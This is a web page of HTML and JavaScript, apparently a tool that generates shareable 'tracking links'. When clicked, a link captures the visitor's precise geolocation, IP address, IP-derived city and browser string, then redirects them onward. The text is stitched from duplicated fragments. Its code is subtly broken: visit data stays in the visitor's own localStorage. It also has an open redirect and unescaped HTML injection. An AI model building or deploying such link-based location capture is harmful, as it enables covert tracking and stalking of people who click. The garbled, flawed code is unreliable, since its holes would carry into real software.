                        }
                        
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 5000,
                            maximumAge: 0
                        });
                    });

                    visit.location = `${position.coords.latitude.toFixed(4)}, ${position.coords.longitude.toFixed(4)}`;
                    visit.accuracy = position.coords.accuracy;
                    
                } catch (geoError) {
                    // Fallback to IP-based location
                    try {
                        const ipLocation = await getIPLocation(visit.ip);
                        visit.location = ipLocation;
                    } catch (ipError) {
                        visit.location = 'Approximate location unavailable';
                    }
                }

                // Add visit to link
                link.visits.unshift(visit);
                
                // Update storage
                localStorage.setItem('trackingLinks', JSON.stringify(links));
                
                // Redirect to destination
                const urlParams = new URLSearchParams(window.location.search);
                const destination = urlParams.get('dest') || 'https://example.com';
                window.location.href = destination;
                
            } catch (error) {
                console.error('Tracking error:', error);
                const urlParams = new URLSearchParams(window.location.search);
                const destination = urlParams.get('dest') || 'https://example.com';
                window.location.href = destination;
            }
        }

        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'Unknown';
            }
        }

        async function getIPLocation(ip) {
            try {
                if (ip === 'Unknown') return 'Location unavailable';
                
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await response.json();
                
                if (data.error) return 'Location unavailable';
                
                return `${data.city || ''}${data.city && data.country_name ? ', ' : ''}${data.country_name || ''}`;
            } catch {
                return 'Approximate location';
            }
        }

        // Initialize the app
        displayLinks();
    </script>
</body>
</html>

                    <h1 class="text-3xl md:text-4xl font-bold mb-2">
                        <i class="fas fa-link mr-3"></i>Location Tracker Links
                    </h1>
                    <p class="text-blue-100">Create tracking links that capture visitor locations</p>
                </div>
                <div class="w-16 h-16 bg-white/20 rounded-full flex items-center justify-center">
                    <i class="fas fa-map-marker-alt text-2xl text-white"></i>
                </div>
            </div>
        </div>
    </header>

    <!-- Main Content -->
    <main class="container mx-auto px-4 py-8">
        <!-- Create Link Section -->
        <div class="bg-white rounded-lg shadow-lg p-6 mb-8">
            <h2 class="text-2xl font-semibold text-gray-800 mb-6">
                <i class="fas fa-plus-circle mr-2 text-blue-500"></i>Create New Tracking Link
            </h2>
            
            <form id="createLinkForm" class="space-y-4">
                <div>
                    <label for="linkName" class="block text-sm font-medium text-gray-700 mb-2">
                        <i class="fas fa-tag mr-2"></i>Link Name
                    </label>
                    <input 
                        type="text" 
                        id="linkName" 
                        required 
                        placeholder="e.g., Marketing Campaign #1"
                        class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                    >
                </div>
                
                <div>
                    <label for="destinationUrl" class="block text-sm font-medium text-gray-700 mb-2">
                        <i class="fas fa-external-link-alt mr-2"></i>Destination URL (Optional)
                    </label>
                    <input 
                        type="url" 
                        id="destinationUrl" 
                        placeholder="https://your-website.com"
                        class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                    >
                </div>

                <button 
                    type="submit" 
                    class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-6 rounded-lg transition duration-200 flex items-center justify-center"
                >
                    <i class="fas fa-magic mr-2"></i>Generate Tracking Link
                </button>
            </form>
        </div>

        <!-- Active Links Section -->
        <div class="bg-white rounded-lg shadow-lg p-6">
            <h2 class="text-2xl font-semibold text-gray-800 mb-6">
                <i class="fas fa-list mr-2 text-green-500"></i>Active Tracking Links
            </h2>
            
            <div id="linksContainer" class="space-y-4">
                <div class="text-center py-12 text-gray-500" id="noLinksMessage">
                    <i class="fas fa-link text-4xl mb-4 opacity-50"></i>
                    <p>No tracking links created yet. Create your first link above!</p>
                </div>
            </div>
        </div>
    </main>

    <!-- Modal for New Link -->
    <div id="linkModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden">
        <div class="bg-white rounded-lg p-6 m-4 max-w-md w-full">
            <h3 class="text-xl font-semibold text-gray-800 mb-4">
                <i class="fas fa-check-circle text-green-500 mr-2"></i>Tracking Link Created!
            </h3>
            <p class="text-gray-600 mb-4">Your tracking link is ready. Share this URL:</p>
            <div class="bg-gray-100 p-3 rounded-lg mb-4">
                <input 
                    type="text" 
                    id="generatedLink" 
                    readonly 
                    class="w-full bg-transparent border-none outline-none text-blue-600 font-mono text-sm"
                >
            </div>
            <button 
                onclick="copyToClipboard()" 
                class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 px-4 rounded-lg mb-2"
            >
                <i class="fas fa-copy mr-2"></i>Copy Link
            </button>
            <button 
                onclick="closeModal()" 
                class="w-full bg-gray-200 hover:bg-gray-300 text-gray-800 font-semibold py-2 px-4 rounded-lg"
            >
                Close
            </button>
        </div>
    </div>

    <!-- Tracking Script -->
    <script>
        // Initialize storage
        let trackingLinks = JSON.parse(localStorage.getItem('trackingLinks')) || [];
        
        // Check if this is a tracking link visit
        const urlParams = new URLSearchParams(window.location.search);
        const trackId = urlParams.get('track');
        
        if (trackId) {
            // This is a tracking link visit - capture location and redirect
            trackVisit(trackId);
        } else {
            // Normal visit - display the dashboard
            displayLinks();
        }

        // Form submission handler
        document.getElementById('createLinkForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const linkName = document.getElementById('linkName').value;
            const destinationUrl = document.getElementById('destinationUrl').value || 'https://example.com';
            
            // Generate unique ID
            const trackId = generateUniqueId();
            const trackingLink = `${window.location.origin}${window.location.pathname}?track=${trackId}&dest=${encodeURIComponent(destinationUrl)}`;
            
            // Create link object
            const linkObject = {
                id: trackId,
                name: linkName,
                trackingUrl: trackingLink,
                destination: destinationUrl,
                createdAt: new Date().toISOString(),
                visits: []
            };
            
            // Save to storage
            trackingLinks.unshift(linkObject);
            localStorage.setItem('trackingLinks', JSON.stringify(trackingLinks));
            
            // Show modal with generated link
            document.getElementById('generatedLink').value = trackingLink;
            document.getElementById('linkModal').classList.remove('hidden');
            
            // Reset form
            this.reset();
        });

        function generateUniqueId() {
            return Date.now().toString(36) + Math.random().toString(36).substr(2);
        }

        function displayLinks() {
            const container = document.getElementById('linksContainer');
            const noLinksMessage = document.getElementById('noLinksMessage');
            
            if (trackingLinks.length === 0) {
                noLinksMessage.classList.remove('hidden');
                container.innerHTML = '';
                return;
            }
            
            noLinksMessage.classList.add('hidden');
            
            container.innerHTML = trackingLinks.map(link => `
                <div class="link-card bg-white border-l-4 border-blue-500 rounded-lg p-4 shadow-sm">
                    <div class="flex justify-between items-start mb-3">
                        <div>
                            <h3 class="font-semibold text-gray-800">${link.name}</h3>
                            <p class="text-sm text-gray-600">Created: ${new Date(link.createdAt).toLocaleDateString()}</p>
                        </div>
                        <span class="bg-blue-100 text-blue-800 text-xs font-medium px-2.5 py-0.5 rounded">
                            ${link.visits.length} visits
                        </span>
                    </div>
                    
                    <div class="mb-3">
                        <label class="block text-sm font-medium text-gray-700 mb-1">Tracking URL:</label>
                        <div class="flex items-center bg-gray-100 p-2 rounded">
                            <input 
                                type="text" 
                                value="${link.trackingUrl}" 
                                readonly 
                                class="flex-1 bg-transparent border-none outline-none text-blue-600 text-sm font-mono truncate"
                            >
                            <button onclick="copyLink('${link.trackingUrl}')" class="ml-2 text-blue-600 hover:text-blue-800">
                                <i class="fas fa-copy"></i>
                            </button>
                        </div>
                    </div>
                    
                    ${link.visits.length > 0 ? `
                        <div class="mt-4">
                            <h4 class="font-medium text-gray-700 mb-2">
                                <i class="fas fa-map-marker-alt mr-2 text-red-500"></i>Recent Visits
                            </h4>
                            <div class="space-y-2">
                                ${link.visits.slice(0, 3).map(visit => `
                                    <div class="flex items-center justify-between text-sm p-2 bg-gray-50 rounded">
                                        <div>
                                            <span class="font-medium">${visit.location || 'Unknown location'}</span>
                                            <div class="text-xs text-gray-500">
                                                ${new Date(visit.timestamp).toLocaleString()}
                                            </div>
                                        </div>
                                        <span class="text-xs text-gray-400">
                                            <i class="fas fa-globe mr-1"></i>${visit.browser || 'Unknown'}
                                        </span>
                                    </div>
                                `).join('')}
                            </div>
                        </div>
                    ` : `
                        <div class="text-center py-4 text-gray-500">
                            <i class="fas fa-map-marker-alt text-2xl mb-2 opacity-50"></i>
                            <p class="text-sm">No visits yet. Share your link to start tracking!</p>
                        </div>
                    `}
                </div>
            `).join('');
        }

        function copyLink(url) {
            navigator.clipboard.writeText(url).then(() => {
                alert('Link copied to clipboard!');
            });
        }

        function copyToClipboard() {
            const linkInput = document.getElementById('generatedLink');
            linkInput.select();
            navigator.clipboard.writeText(linkInput.value).then(() => {
                alert('Link copied to clipboard!');
            });
        }

        function closeModal() {
            document.getElementById('linkModal').classList.add('hidden');
            displayLinks(); // Refresh the links list
        }

        async function trackVisit(trackId) {
            try {
                // Find the link in storage
                const links = JSON.parse(localStorage.getItem('trackingLinks')) || [];
                const link = links.find(l => l.id === trackId);
                
                if (!link) {
                    window.location.href = 'https://example.com';
                    return;
                }

                // Get visitor information
                const visit = {
                    timestamp: new Date().toISOString(),
                    ip: await getIPAddress(),
                    browser: navigator.userAgent,
                    location: null
                };

                // Try to get precise location
                try {
                    const position = await new Promise((resolve, reject) => {
                        if (!navigator.geolocation) {
                            reject(new Error('Geolocation not supported'));
                            return;
                        }
                        
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 5000,
                            maximumAge: 0
                        });
                    });

                    visit.location = `${position.coords.latitude.toFixed(4)}, ${position.coords.longitude.toFixed(4)}`;
                    visit.accuracy = position.coords.accuracy;
                    
                } catch (geoError) {
                    // Fallback to IP-based location
                    try {
                        const ipLocation = await getIPLocation(visit.ip);
                        visit.location = ipLocation;
                    } catch (ipError) {
                        visit.location = 'Approximate location unavailable';
                    }
                }

                // Add visit to link
                link.visits.unshift(visit);
                
                // Update storage
                localStorage.setItem('trackingLinks', JSON.stringify(links));
                
                // Redirect to destination
                const urlParams = new URLSearchParams(window.location.search);
                const destination = urlParams.get('dest') || 'https://example.com';
                window.location.href = destination;
                
            } catch (error) {
                console.error('Tracking error:', error);
                const urlParams = new URLSearchParams(window.location.search);
                const destination = urlParams.get('dest') || 'https://example.com';
                window.location.href = destination;
            }
        }

        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'Unknown';
            }
        }

        async function getIPLocation(ip) {
            try {
                if (ip === 'Unknown') return 'Location unavailable';
                
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await response.json();
                
                if (data.error) return 'Location unavailable';
                
                return `${data.city || ''}${data.city && data.country_name ? ', ' : ''}${data.country_name || ''}`;
            } catch {
                return 'Approximate location';
            }
        }

        // Initialize the app
        displayLinks();
    </script>
</body>
</html>

